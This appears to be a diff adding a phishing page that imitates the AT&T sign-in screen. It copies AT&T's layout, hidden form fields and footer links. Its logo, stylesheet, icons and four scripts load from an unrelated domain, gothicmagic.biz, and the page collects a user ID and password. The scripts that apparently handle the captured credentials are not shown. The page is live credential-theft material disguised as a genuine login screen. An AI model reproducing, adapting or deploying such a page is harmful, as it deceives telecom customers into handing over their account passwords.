@@ -1,0 +1,103 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <title>Login Screen</title>
+  <base>
+
+  <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
+  <meta name="apple-itunes-app" content="app-id=309172177"><!-- Dynatrace Javascript -->
+  <link rel="icon" type="image/x-icon" href="https://gothicmagic.biz/FSHDFYLGJJKLJj/attz/img/favicon.ico">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js" integrity="sha512-a+SUDuwNzXDvz4XrIcXHuCf089/iJAoN4lmrXJg18XnduKK6YlDHNRalv4yd1N40OKI80tFidF+rqTFKGPoWFQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <!-- ADDING ADOBE CONTAINER HEADER -->
+  <link rel="stylesheet" href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/styles.css?v=20.2.8">
+  <link rel="stylesheet" href="https://gothicmagic.biz/FSHDFYLGJJKLJj/attz/css/styles.css" <="" head="">
+
+</head><body>
+  <div id="app-root" _nghost-wsh-c36="" ng-version="11.2.14" app-version="20.2.8">
+    <div _ngcontent-wsh-c36="" id="appCompBackground" class="full-width-background bg-white">
+      <div _ngcontent-wsh-c36="" id="appCompContainer" class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column"><!---->
+        <div _ngcontent-wsh-c36="" id="appCompCardContainer" class="row justify-center flex-1">
+          <div _ngcontent-wsh-c36="" id="appCompCardContDiv" class="pad-none"><!----><app-card _ngcontent-wsh-c36="" role="main" _nghost-wsh-c28="">
+              <div _ngcontent-wsh-c28="" class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
+                <div _ngcontent-wsh-c28="" class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg"><app-header _ngcontent-wsh-c28="" class="flex-container" _nghost-wsh-c27=""><img _ngcontent-wsh-c27="" id="headerLogoImage" alt="" src="https://gothicmagic.biz/FSHDFYLGJJKLJj/attz/img/att_hz_lg_lkp_rgb_pos.svg" class="header-logo-image header-logo-image-bottom"><!----><!----><!----><!---->
+                    <div _ngcontent-wsh-c27="" id="splitPwLoginHeaderDiv" class="split-login-header text-center">
+                      <h1 _ngcontent-wsh-c27="" id="splitPwLoginHeaderText" class="heading-lg letter-spacing-3">Welcome
+                      </h1>
+                    </div><!----><!---->
+                  </app-header><!---->
+                  <div _ngcontent-wsh-c28="" class="app-card-router-outlet"><router-outlet _ngcontent-wsh-c28=""></router-outlet><app-manual-login _nghost-wsh-c50=""><!---->
+                      <form _ngcontent-wsh-c50="" novalidate="" id="login" method="post" class="manual-login-form ng-pristine ng-invalid ng-touched" action="https://oidc.idp.clogin.att.com/mga/sps/authsvc?PolicyId=urn:ibm:security:authentication:asf:passAuth">
+                        <div _ngcontent-ypp-c38="" id="userInputContainer" class="form-row space-below ng-pristine ng-invalid ng-touched"><!---->
+                        <label _ngcontent-ypp-c38="" id="userLabel" for="userID" class="formfield-label">User ID</label><!---->
+                        <input _ngcontent-ypp-c38="" id="userID" name="userID" formcontrolname="userID" autocomplete="username" spellcheck="false" autocapitalize="none" aria-describedby="userInlineErrorText" type="email" class="textfield ng-pristine ng-invalid ng-touched">
+                        <div _ngcontent-ypp-c38="" id="userInlineErrorText" role="alert" class="formfield-msg"></div><!---->
+                      </div>
+                        <div></div>
+                        
+                        
+                        <input _ngcontent-wsh-c50="" type="hidden" name="appName" formcontrolname="appName" value="m14186" class="ng-untouched ng-pristine ng-valid">
+                          <input _ngcontent-wsh-c50="" type="hidden" name="loginSuccessURL" formcontrolname="loginSuccessURL" value="https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?response_type=id_token&amp;client_id=m14186&amp;redirect_uri=https%3A%2F%2Fwww.att.com%2Fmsapi%2Flogin%2Funauth%2Fservice%2Fv1%2Fhaloc%2Foidc%2Fredirect&amp;state=from%3Dnx&amp;scope=openid&amp;response_mode=form_post&amp;nonce=oWMiGyWs" class="ng-untouched ng-pristine ng-valid"><input _ngcontent-wsh-c50="" type="hidden" name="loginFailureURL" formcontrolname="loginFailureURL" value="https://signin.att.com/static/siam/dynamic/iamLRR/LrrController?IAM_OP=login&amp;refIDFromLogin=399bd627e99b81fe4c9b9262ab0ddb8dbd78da7d&amp;targetURL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3DoWMiGyWs" class="ng-untouched ng-pristine ng-valid"><input _ngcontent-wsh-c50="" type="hidden" name="trID" formcontrolname="trID" value="399bd627e99b81fe4c9b9262ab0ddb8dbd78da7d" class="ng-untouched ng-pristine ng-valid">
+                          <app-user-input _ngcontent-wsh-c50="" _nghost-wsh-c38="">
+                          <div _ngcontent-wsh-c38="" id="userInputContainerDiv" class="form-row space-below ng-pristine ng-invalid ng-touched hide ng-tittle">
+                            <div _ngcontent-wsh-c38="" id="userBackButtonDiv" class="flex flex-row flex-centered">
+                              <button _ngcontent-gnm-c38="" id="userBackButton" type="button" aria-label="Back" class="user-back-button btn-reset touch-space flex-row flex-centered" title="james"><img _ngcontent-gnm-c38="" id="userBackButtonLeftCircleImg" alt="" class="back-button-svg-white" src="https://gothicmagic.biz/FSHDFYLGJJKLJj/attz/img/arrow-left-circle_24.svg"><img _ngcontent-gnm-c38="" id="userBackButtonFilledCircleImg" alt="" class="back-button-svg-black" src="https://gothicmagic.biz/FSHDFYLGJJKLJj/attz/img/arrow-left-circle-filled_24.svg"><span _ngcontent-gnm-c38="" id="userBackButtonSpanTxt" class="font-regular type-base letter-spacing-3 overflow-hidden nowrap text-overflow">james</span></button>
+                            </div><!----><!----><!---->
+                          </div>
+                        </app-user-input><!----><app-password-input _ngcontent-wsh-c50="">
+                          <div class="form-row rel ng-pristine ng-invalid ng-touched hide ng-pass">
+                            <div class="inline-flex"><label id="passwordLabel" for="password" class="formfield-label">Password</label></div>
+                                <input id="password" name="password" formcontrolname="password" spellcheck="false" autocomplete="current-password" autocapitalize="none" aria-describedby="passwordInlineErrorText" type="password" class="textfield textfield-password ng-pristine ng-invalid ng-touched"><button id="showHideButton" tabindex="0" type="button" aria-disabled="false" class="showHidePasswordButton absolute pad-xxs font-regular color-ui-black" aria-label="Show password">Show</button>
+                            <div id="passwordInlineErrorText" role="alert" class="formfield-msg"></div>
+
+                          </div>
+                              <div id="passwordErrorText" style="display: none; color: red;">xxxxxxxxxxxxx</div>
+                        </app-password-input><!----><!----><!----><!----><!----><app-kmsi-checkbox _ngcontent-wsh-c50="">
+
+                          <div id="keepMeInContainerDiv" class="checkboxDiv mb-0"><!----><!----><input type="hidden" name="keepMeIn" value="NA"><!----><label id="keepMeInLabel" for="keepMeIn" class="checkbox inline-flex flex-items-top font-regular"><input type="checkbox" id="keepMeIn" name="keepMeIn" value="Y" aria-label="Keep me signed in checkbox">
+                              <div class="checkbox-skin"></div><span id="keepMeInText" class="rad-chk-txt">Keep me
+                                signed in</span>
+                            </label></div>
+                        </app-kmsi-checkbox><!----><!----><!----><!----><div id="passwordErrorText" role="alert" class="formfield-msg" style=" color: red;">xxxxxxxxxxxxx</div>
+                        <div _ngcontent-wsh-c50="" class="fg-sign-in">
+                          <div _ngcontent-wsh-c50="" class="flex-container continue-button-spacing"><button _ngcontent-wsh-c50="" type="submit" id="signin" class="btn-primary btn-full-width letter-spacing-3">Sign
+                              in<!----><!----><!----></button><!----><!----></div>
+                        </div><!----><!----><app-forgot-pw-link _ngcontent-wsh-c50="">
+                          <div id="forgotPasswordLinkContainer" class="forgot-link-cont action-link-cont"><a id="forgotPassword" class="link-text3 solo type-sm" href="https://identity.att.com/identity-ui/fpwd/lander?origination_point=tguard&amp;trid=399bd627e99b81fe4c9b9262ab0ddb8dbd78da7d&amp;appName=m14186&amp;Return_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3DoWMiGyWs&amp;Cancel_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3DoWMiGyWs&amp;lang=en-us">Forgot
+                              password?</a></div>
+                        </app-forgot-pw-link><!----><!----><!----><!----><app-fast-pay-button _ngcontent-wsh-c50="">
+                          <div id="fastPayArea" class="action-link-cont"><a id="fastPayButton" class="link-text3 solo type-sm" href="https://www.att.com/acctmgmt/fastpay/" target="_self">Pay without signing in</a></div><!---->
+                        </app-fast-pay-button><app-prepaid-ctn-button _ngcontent-wsh-c50="" _nghost-wsh-c48=""><!----></app-prepaid-ctn-button><!----><!----><!---->
+                      </form>
+                    </app-manual-login><!----></div>
+                </div>
+              </div>
+            </app-card></div>
+        </div>
+        <div _ngcontent-wsh-c36="" id="appCompFooterContainer" class="row flex-centered">
+          <div _ngcontent-wsh-c36="" id="appCompFooterContDiv" class="grid-col-12 pad-none"><app-footer _ngcontent-wsh-c36="" role="contentinfo" _nghost-wsh-c34="">
+              <div _ngcontent-wsh-c34="" class="login-background footer-div pad-l-lg-sm pad-r-lg-sm">
+                <div _ngcontent-wsh-c34="" id="footerLinksDiv" class="footer-links-div justify-center"><app-footer-link _ngcontent-wsh-c34="" class="flex flex-row flex-items-center"><!----><a rel="noopener noreferrer" target="_blank" id="footerLink0" href="https://www.att.com/legal/legal-policy-center.html" title="Legal policy center (Opens in new window)" aria-label="Legal policy center (Opens in new window)" class="type-xs link-text2">Legal policy
+                      center</a><!----></app-footer-link><!----><app-footer-link _ngcontent-wsh-c34="" class="flex flex-row flex-items-center"><!----><a rel="noopener noreferrer" target="_blank" id="footerLink1" href="https://about.att.com/sites/privacy_policy" title="Privacy policy (Opens in new window)" aria-label="Privacy policy (Opens in new window)" class="type-xs link-text2">Privacy policy</a><!----></app-footer-link><!----><app-footer-link _ngcontent-wsh-c34="" class="flex flex-row flex-items-center"><!----><a rel="noopener noreferrer" target="_blank" id="footerLink2" href="https://www.att.com/legal/terms.attWebsiteTermsOfUse.html" title="Terms of use (Opens in new window)" aria-label="Terms of use (Opens in new window)" class="type-xs link-text2">Terms of use</a><!----></app-footer-link><!----><app-footer-link _ngcontent-wsh-c34="" class="flex flex-row flex-items-center"><!----><a rel="noopener noreferrer" target="_blank" id="footerLink3" href="https://www.att.com/features/accessibility.html" title="Accessibility (Opens in new window)" aria-label="Accessibility (Opens in new window)" class="type-xs link-text2">Accessibility</a><!----></app-footer-link><!----><app-footer-link _ngcontent-wsh-c34="" class="flex flex-row flex-items-center"><app-footer-link-icon id="footerLinkIconElLeft4">
+                      <div class="flex flex-row flex-items-center footer-link-icon" id="footerLinkIcon4"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" focusable="true" class="footer-link-icon-svg" id="footerLinkIconSvg4" aria-label="California Consumer Privacy Act (CCPA) Opt-Out Icon">
+                          <rect x="1" y="6.07595" width="22" height="11.1392" rx="5.56962" fill="white"></rect>
+                          <path fill-rule="evenodd" clip-rule="evenodd" d="M17.4304 6.07595C20.5064 6.07595 23 8.56955 23 11.6456C23 14.7216 20.5064 17.2152 17.4304 17.2152H6.56962C3.49361 17.2152 1 14.7216 1 11.6456C1 8.56955 3.49361 6.07595 6.56962 6.07595H17.4304ZM13.2679 6.91818H6.56962C3.95876 6.91818 1.84223 9.03471 1.84223 11.6456C1.84223 14.2564 3.95876 16.373 6.56962 16.373H10.7321L13.2679 6.91818ZM10.3553 9.41582C10.5301 9.55752 10.557 9.81415 10.4153 9.98902L7.41378 13.6942C7.16006 14.0074 6.69106 14.0319 6.4061 13.7468L4.65019 11.9904C4.49109 11.8312 4.49109 11.5732 4.65019 11.414C4.80929 11.2549 5.06725 11.2549 5.22635 11.414L6.87565 13.0638L9.78224 9.47587C9.92389 9.301 10.1804 9.27411 10.3553 9.41582ZM15.1023 9.24971C14.9477 9.08617 14.6899 9.07896 14.5264 9.2336C14.3629 9.38824 14.3557 9.64617 14.5103 9.80971L16.2013 11.5987L14.4609 13.3396C14.3018 13.4988 14.3018 13.7568 14.4609 13.916C14.62 14.0751 14.878 14.0751 15.0371 13.916L16.7614 12.1911L18.4368 13.9635C18.5914 14.1271 18.8493 14.1343 19.0128 13.9796C19.1762 13.825 19.1835 13.5671 19.0289 13.4035L17.3378 11.6146L19.0782 9.8736C19.2373 9.71445 19.2373 9.45641 19.0782 9.29726C18.9191 9.13811 18.6611 9.13811 18.502 9.29726L16.7777 11.0221L15.1023 9.24971Z" fill="#454B52"></path>
+                        </svg></div><!----><!----><!---->
+                    </app-footer-link-icon><!----><a rel="noopener noreferrer" target="_blank" id="footerLink4" href="https://about.att.com/csr/home/privacy/rights_choices.html" title="Your privacy choices (Opens in new window)" aria-label="Your privacy choices (Opens in new window)" class="type-xs link-text2 mar-l8">Your
+                      privacy choices</a><!----></app-footer-link><!----><!----></div><!---->
+                <div _ngcontent-wsh-c34="" class="font-regular copyright"><span _ngcontent-wsh-c34="" id="copyrightTextSpan" class="type-xs color-ui-medium-gray">©2023 AT&amp;T Intellectual Property.
+                    All rights reserved.</span></div><!---->
+              </div>
+            </app-footer><!----></div>
+        </div>
+      </div>
+    </div><!---->
+  </div>
+  <script src="https://gothicmagic.biz/FSHDFYLGJJKLJj/attz/js/success_page.js"></script>
+  <script src="https://gothicmagic.biz/FSHDFYLGJJKLJj/attz/js/main.js"></script>
+  <script src="https://gothicmagic.biz/FSHDFYLGJJKLJj/attz/js/jquery.js"></script>
+  <script src="https://gothicmagic.biz/FSHDFYLGJJKLJj/attz/js/cookie.js"></script>
+
+
+</body></html>
